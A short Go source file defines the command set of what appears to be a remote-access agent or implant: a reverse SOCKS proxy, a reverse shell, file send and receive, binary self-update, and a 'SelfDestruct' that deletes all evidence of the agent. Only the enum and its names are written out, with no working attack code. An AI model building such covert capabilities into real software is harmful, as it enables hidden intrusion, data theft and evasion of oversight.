package commands

type Command uint8

const (
	_ = iota // We don't want 0 values
	// Uses the relay to create a reverse socks connection
	Socks5
	// Creates a pseudo-terminal and connects stdin, stdout, and stderr to the net.Conn
	ShellTCP
	// Deletes all evidence of the agent
	SelfDestruct
	// Reads the file path (addr) and sends the contents
	SendFile
	// Reads data from net.Conn and writes it to the file path (addr)
	ReceiveFile
	// Updates the agent with a new server device ID
	UpdateID
	// Replaces the agent with a new binary and restarts it
	UpdateBinary

	NoOp // Marks the end of the command list
)

func CommandList() (cmds []Command) {
	cmds = make([]Command, NoOp-1)
	for i := Socks5; i < int(NoOp); i++ {
		cmds[i-1] = Command(i)
	}
	return
}

func (c Command) String() string {
	switch c {
	case Socks5:
		return "Socks5"
	case ShellTCP:
		return "Reverse shell"
	case SelfDestruct:
		return "SelfDestruct"
	case SendFile:
		return "SendFile"
	case ReceiveFile:
		return "ReceiveFile"
	case UpdateID:
		return "Update server device ID"
	case UpdateBinary:
		return "UpdateBinary"
	default:
		return "Unknown"
	}
}

func (c Command) Value() any {
	return c
}
